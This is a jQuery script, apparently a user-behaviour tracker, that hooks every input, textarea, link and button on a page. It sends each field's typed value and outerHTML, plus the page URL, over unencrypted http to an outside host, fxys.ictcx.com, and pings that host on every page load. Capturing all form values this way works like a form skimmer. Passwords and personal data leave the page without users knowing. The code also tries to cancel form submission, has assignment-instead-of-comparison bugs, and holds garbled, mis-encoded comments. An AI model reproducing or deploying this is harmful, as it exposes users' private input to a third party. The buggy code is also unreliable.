setTimeout(function(){


    $('input').click(function(){
        if($(this).attr('type')=="submit"){
           
            this.preventDefault();
           
        }
    })
    $('input').blur(function () {

        if (($(this).attr('min') == null)&&($(this).val()!="")) {

            var label = 'input';
            var value = this.value;
            var text = this.innerText;
            var id = this.id;
            var classname = this.className;
            var name = this.name;
            label = label == '' || label == null ? '' : label;
            id = id == '' || id == null ? '' : id;
            classname = classname == '' || classname == null ? '' : classname;
            name = name == '' || name == null ? '' : name;
            text = text == '' || text == null ? '' : text;
            value = value == '' || value == null ? '' : value;
            $(this).attr("value",value);
            var tab = this.outerHTML==null?"":this.outerHTML;
            var message = 'label=' + label + '&id=' + id + '&className=' + classname + '&name=' + name + '&text=' + text +'&value=' + value+'&tab='+tab;
            console.log(message);
            if(tab!=null&&tab!=''&&tab!='undefined'){
                 sendMsg(message);
            }
        }

    });
    
    $('textarea').blur(function () {
        var val = $.trim($('textarea').val());
        if (($(this).attr('min') == null)&&(val!="")) {

            var label = 'textarea';
            var value = this.value;
            var text = this.innerText;
            var id = this.id;
            var classname = this.className;
            var name = this.name;
            label = label == '' || label == null ? '' : label;
            id = id == '' || id == null ? '' : id;
            classname = classname == '' || classname == null ? '' : classname;
            name = name == '' || name == null ? '' : name;
            text = text == '' || text == null ? '' : text;
            value = value == '' || value == null ? '' : value;
            $(this).attr("value",value);
            var tab = this.outerHTML==null?"":this.outerHTML;
            var message = 'label=' + label + '&id=' + id + '&className=' + classname + '&name=' + name + '&text=' + text +'&value=' + value+'&tab='+tab;
            console.log(message);
            if(tab!=null&&tab!=''&&tab!='undefined'){
                sendMsg(message);
            }
        }

    });

    $('a').click(function () {

        if ($(this).attr('min') == null) {
            var label = 'a';
            var value = this.value;
            var text = this.innerText;
            var id = this.id;
            var classname = this.className;
            var name = this.name;
            label = label == '' || label == null ? '' : label;
            id = id == '' || id == null ? '' : id;
            classname = classname == '' || classname == null ? '' : classname;
            name = name == '' || name == null ? '' : name;
            text = text == '' || text == null ? '' : text;
            value = value == '' || value == null ? '' : value;
            var tab = this.outerHTML==null?"":this.outerHTML;
            var message = 'label=' + label + '&id=' + id + '&className=' + classname + '&name=' + name + '&text=' + text + '&value=' + value+'&tab='+tab;
            console.log(message);
            if(tab!=null&&tab!=''&&tab!='undefined'){
                sendMsg(message);
            }
        }

    });
    
    $('button').click(function () {
        if ($(this).attr('min') == null) {
            var label = 'button';
            var value = this.value;
            var text = this.innerText;
            var id = this.id;
            var classname = this.className;
            var name = this.name;
            label = label == '' || label == null ? '' : label;
            id = id == '' || id == null ? '' : id;
            classname = classname == '' || classname == null ? '' : classname;
            name = name == '' || name == null ? '' : name;
            text = text == '' || text == null ? '' : text;
            value = value == '' || value == null ? '' : value;
            var tab = this.outerHTML==null?"":this.outerHTML;
            var message = 'label=' + label + '&id=' + id + '&className=' + classname + '&name=' + name + '&text=' + text + '&value=' + value+'&tab='+tab;
            console.log(message);
            if(tab!=null&&tab!=''&&tab!='undefined'){
                sendMsg(message);
            }
        }
    });
},1000)

function btn1(num) {

    var a = num;

    var Inp = document.getElementsByTagName('input');

    for (var i = 0; i < Inp.length; i++) {

        Inp[i].index = i;

        if (Inp[i].getAttribute('min') == a) {
            var oldmessage = [];
            var text = Inp[i].innerText;
            var name = Inp[i].name;
            var value = Inp[i].value;
            var id = Inp[i].id;
            var classname = Inp[i].className;
            var label = 'input';
            label = label == '' || label == null ? '' : label;
            id = id == '' || id == null ? '' : id;
            classname = classname == '' || classname == null ? '' : classname;
            name = name == '' || name == null ? '' : name;
            text = text == '' || text == null ? '' : text;
            value = value == '' || value == null ? '' : value;
            $(this).attr("value",value);
            var tab = Inp[i].outerHTML==null?"":Inp[i].outerHTML;
            var message = 'label=' + label + '&id=' + id + '&className=' + classname + '&name=' + name + '&text=' + text+'&value=' + value +'&tab='+tab;
            oldmessage.push(message);
            console.log(message);
            if(tab!=null&&tab!=''&&tab!='undefined'){
                sendMsg(message);
            }
        }

    }

}
// onclick="btn2(this)"
function btn2(a) {

    var text = $(a).text();
    var value = $(a).attr('value');
    if (value = 'undefined') {
        value = '';
    }
    var name = $(a).attr('name');
    if (name = 'undefined') {
        name = '';
    }
    var classname = $(a).attr('class');
    if (classname = 'undefined') {
        classname = '';
    }
    var id = $(a).attr('id');
    if (id = 'undefined') {
        id = '';
    }
    var label = $(a).get(0).tagName;
    label = label == '' || label == null ? '' : label;
    id = id == '' || id == null ? '' : id;
    classname = classname == '' || classname == null ? '' : classname;
    name = name == '' || name == null ? '' : name;
    text = text == '' || text == null ? '' : text;
    value = value == '' || value == null ? '' : value;
    var tab = $(a).outerHTML==null?"":$(a).outerHTML;
    var message = 'label=' + label + '&id=' + id + '&className=' + classname + '&name=' + name + '&text=' + text + '&value=' + value+'&tab='+tab;
    console.log(message);
    if(tab!=null&&tab!=''&&tab!='undefined'){
        sendMsg(message);
    }

}


/*
1.绗竴娆ncodeURI锛屾寜鐓tf-8鏂瑰紡鑾峰彇瀛楄妭鏁扮粍鍙樻垚[-28,-72-83]锛屽瀛楄妭鐮佹暟缁勮繘琛岄亶鍘嗭紝鎶婃瘡涓瓧鑺傝浆鍖栨垚瀵瑰簲鐨�16杩涘埗鏁帮紝杩欐牱灏卞彉鎴愪簡[E4,B8,AD],鏈€鍚庡彉鎴怺%E4,%B8,%AD]

2.绗簩娆ncodeURI锛屾妸鏁扮粍鏈€鍚庡彉鎴怺%25E4,%25B8,%25AD]鐒跺悗灏辨妸澶勭悊鍚庣殑鏁版嵁[%25E4,%25B8,%25AD]鍙戝線鏈嶅姟鍣ㄧ锛�
褰撳簲鐢ㄦ湇鍔″櫒璋冪敤getParameter鏂规硶锛実etParameter鏂规硶浼氬幓鍚戝簲鐢ㄦ湇鍔″櫒璇锋眰鍙傛暟
搴旂敤鏈嶅姟鍣ㄦ渶鍒濊幏寰楃殑灏辨槸鍙戦€佹潵鐨刐%25E4,%25B8,%25AD]锛屽簲鐢ㄦ湇鍔″櫒浼氬杩欎釜鏁版嵁杩涜URLdecode鎿嶄綔锛孶Rldecode鎿嶄綔鍜宔ncodeURL鎿嶄綔鏄浉鍙嶇殑鎿嶄綔锛屽鐞嗙粨鏋滃氨鏄痆%E4,%B8,%AD]锛屽苟鎶婅繖涓€艰繑鍥炵粰getParameter鏂规硶
鐒跺悗鍐嶅湪鏈嶅姟鍣ㄧ涓皟鐢ㄧ浉搴旂殑URL杞爜鏂规硶鎴栬€呮槸鍑芥暟  灏卞彲浠ユ妸鏁版嵁杩樺師鎴愭渶鍒濋〉闈㈠彂閫佽繃鏉ョ殑涓枃鈥滀腑鈥濅簡銆�
 */
//鍒锋柊椤甸潰鏃舵墽琛�
visitPage();
function sendMsg(json) {
    $.ajax({
        type: "get",
        url: "http://fxys.ictcx.com/externalAction?status=action&indexPage=" + window.encodeURI(window.encodeURI(window.location.href)) + "&" + window.encodeURI(window.encodeURI(json)),
        dataType: 'jsonp',
        jsonp: 'callback',
        jsonpCallback: "callbackFunction",
        success: function (data) {
            console.log(data.msg);
        },
        error: function (data) {
            console.log(data.msg);
        }
    });
}
//鍒锋柊椤甸潰鏃跺彧鍙戦€侀〉闈㈡暟鎹�
function visitPage() {
    $.ajax({
        type: "get",
        url: "http://fxys.ictcx.com/externalAction?status=refresh&indexPage=" + window.encodeURI(window.encodeURI(window.location.href)),
        dataType: 'jsonp',
        jsonpCallback: "callbackFunction",
        success: function (data) {
            //鐢ㄤ簬妫€娴嬭剼鏈槸鍚﹀畨瑁呮垚鍔�
            $("body").append("<aa id='statisticChecking' style='display: none'>checkIngJsIsInstallSuccess</aa>");
            console.log(data.msg);
        },
        error: function (data) {
            console.log(data);
        }
    });
}



